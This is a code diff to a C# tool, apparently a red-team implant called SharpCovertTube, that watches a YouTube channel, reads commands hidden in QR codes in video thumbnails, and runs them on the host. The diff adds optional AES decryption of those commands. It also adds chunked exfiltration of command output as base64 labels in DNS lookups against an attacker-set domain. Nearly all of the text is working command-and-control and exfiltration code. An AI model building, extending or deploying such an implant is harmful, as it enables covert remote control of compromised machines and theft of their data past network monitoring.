@@ -7,6 +7,7 @@ using System.Drawing;
 using System.Diagnostics;
 using System.Collections.Generic;
 using SharpCovertTube.QRCodeDecoder;
+using System.Security.Cryptography;
 
 
 namespace SharpCovertTube
@@ -16,8 +17,10 @@ namespace SharpCovertTube
         // FILL VALUES
         public const string channel_id = "";
         public const string api_key = "";
+        public const string payload_aes_key = "0000000000000000";
+        public const string payload_aes_iv = "0000000000000000";
         public const string dns_hostname = ".test.org";
-        public const int seconds_delay = 120;
+        public const int seconds_delay = 60;
 
 
         static string ByteArrayToStr(byte[] DataArray)
@@ -37,20 +40,23 @@ namespace SharpCovertTube
             byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
             if (DataByteArray == null)
             {
+                Console.WriteLine("DataByteArray is null");
                 return "";
             }
             string code = ByteArrayToStr(DataByteArray[0]);
             return code;
         }
-
         
+
         static string ReadQR(string thumbnail_url)
         {
+            Console.WriteLine("[+] Request to {0}", thumbnail_url);
             var client = new WebClient();
             var stream = client.OpenRead(thumbnail_url);
             if (stream == null) return "";
-            Bitmap bitmap = new Bitmap(stream);
-            string decoded_cmd = DecodeQR(bitmap);
+            Bitmap bitmap_from_image = new Bitmap(stream);
+            Console.WriteLine("[+] Reading QR from {0}", thumbnail_url);
+            string decoded_cmd = DecodeQR(bitmap_from_image);
             return decoded_cmd;
         }
 
@@ -59,6 +65,13 @@ namespace SharpCovertTube
         {
             var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
             return System.Convert.ToBase64String(plainTextBytes);
+        }
+
+
+        public static string Base64Decode(string base64EncodedData)
+        {
+            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
         }
 
 
@@ -81,25 +94,70 @@ namespace SharpCovertTube
         }
 
 
+        // Source: https://stackoverflow.com/questions/4133377/splitting-a-string-number-every-nth-character-number
+        static IEnumerable<String> SplitInParts(String s, Int32 partLength)
+        {
+            if (s == null)
+            {
+                throw new ArgumentNullException(nameof(s));
+            }
+            if (partLength <= 0)
+            {
+                throw new ArgumentException("Part length has to be positive.", nameof(partLength));
+            }
+            for (var i = 0; i < s.Length; i += partLength)
+                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
+        }
+
+
         static void DNSExfil(string response_cmd) {
-            // Base64
+            // Base64-encode the response
+            if (response_cmd == "")
+            {
+                response_cmd = "null";
+            }
             string base64_response_cmd = Base64Encode(response_cmd);
-            Console.WriteLine("[+] Base64-encoded response:\t{0}", base64_response_cmd);
-            if (base64_response_cmd == "") {
-                base64_response_cmd = "bnVsbC1hbnN3ZXI";
+            Console.WriteLine("[+] Base64-encoded response:\t\t{0}", base64_response_cmd);
+            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
+            if (base64_response_cmd.Length > max_size) {
+                Console.WriteLine("[+] Splitting encoded response in chunks of {0} characters", max_size);
             }
-            // DNS lookup
-            try
+            var parts = SplitInParts(base64_response_cmd, max_size);
+            foreach (var response_portion in parts)
             {
-                string exfil_hostname = base64_response_cmd + dns_hostname;
-                exfil_hostname.Trim();
-                exfil_hostname = exfil_hostname.Replace("=", "");
-                Console.WriteLine("[+] DNS lookup against:\t\t{0}", exfil_hostname);
-                Dns.GetHostAddresses(exfil_hostname);
+                // DNS lookup
+                try
+                {
+                    string exfil_hostname = response_portion + dns_hostname;
+                    exfil_hostname = exfil_hostname.Replace("=", "");
+                    Console.WriteLine("[+] DNS lookup against:\t\t{0}", exfil_hostname);
+                    Dns.GetHostAddresses(exfil_hostname);
+                }
+                catch (Exception e)
+                {
+                    if (e.GetType().ToString() != "System.Net.Sockets.SocketException")
+                    {
+                        Console.WriteLine("[-] Exception: {0}", e.ToString());
+                    }
+                }
             }
-            catch (Exception e)
-            {
-                // Console.WriteLine("[-] Exception: {0}", e.ToString());
+        }
+
+
+        static string TryDecrypt(string payload)
+        {
+            try {
+                // Base64-decode
+                string base64_decoded = Base64Decode(payload);
+                Console.WriteLine("[+] Base64-decoded:\t{0}", base64_decoded);
+
+                string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
+                Console.WriteLine("[+] Payload was AES-encrypted");
+                return decrypted_cmd;
+            }
+            catch {
+                Console.WriteLine("[+] Payload was not AES-encrypted");
+                return payload;
             }
         }
 
@@ -110,12 +168,17 @@ namespace SharpCovertTube
             string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
             
             // Read QR
-            string decoded_cmd = ReadQR(thumbnail_url);
-            Console.WriteLine("[+] Value decoded from QR:\t{0}", decoded_cmd);
-            
+            string qr_decoded_cmd = ReadQR(thumbnail_url);
+            Console.WriteLine("[+] Value decoded from QR:\t{0}", qr_decoded_cmd);
+
+            // Decrypt in case it is AES-encrypted
+            string decrypted_cmd = TryDecrypt(qr_decoded_cmd); 
+            Console.WriteLine("[+] After trying to AES-decrypt:\t{0}", decrypted_cmd);
+
             // Execute command
-            string response_cmd = ExecuteCommand(decoded_cmd);
-            // Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
+            string response_cmd = ExecuteCommand(decrypted_cmd);
+            response_cmd.Trim();
+            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
 
             // Exfiltrate
             DNSExfil(response_cmd);
@@ -128,13 +191,11 @@ namespace SharpCovertTube
             StreamReader objReader = new StreamReader(objStream);
             string json_response_str = "";
             string sLine = "";
-
             while (sLine != null)
             {
                 json_response_str += sLine;
                 sLine = objReader.ReadLine();
             }
-
             return json_response_str;
         }
 
@@ -147,7 +208,6 @@ namespace SharpCovertTube
             var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
             foreach (Item item in deserialized.items)
             {
-                // Console.WriteLine("[+] VideoId: \t{0}", item.id.videoId);
                 VideoIds.Add(item.id.videoId);
             }
 
@@ -159,10 +219,9 @@ namespace SharpCovertTube
             // Initial videos
             List<string> Initial_VideoIds = GetVideoIds(channel_url);
             int number_of_videos = Initial_VideoIds.Count;
-            Console.WriteLine("[+] Videos already uploaded:");
             foreach (string value in Initial_VideoIds)
             {
-                Console.WriteLine("[+] Video with ID: \t{0}", value);
+                Console.WriteLine("[+] Video already uploaded with ID: \t{0}", value);
             }
 
             while (true)
@@ -194,6 +253,37 @@ namespace SharpCovertTube
                     Console.WriteLine("[+] No new videos... Total: {0}", VideoIds.Count);
                 }
             }
+        }
+
+    
+        // AES Decrypt
+        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
+        {
+            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
+            if (cipherText == null || cipherText.Length <= 0)
+                throw new ArgumentNullException("cipherText");
+            if (Key == null || Key.Length <= 0)
+                throw new ArgumentNullException("Key");
+            if (IV == null || IV.Length <= 0)
+                throw new ArgumentNullException("IV");
+            string plaintext = null;
+            using (RijndaelManaged rijAlg = new RijndaelManaged())
+            {
+                rijAlg.Key = Key;
+                rijAlg.IV = IV;
+                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
+                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+                            plaintext = srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+            }
+            return plaintext;
         }
 
 
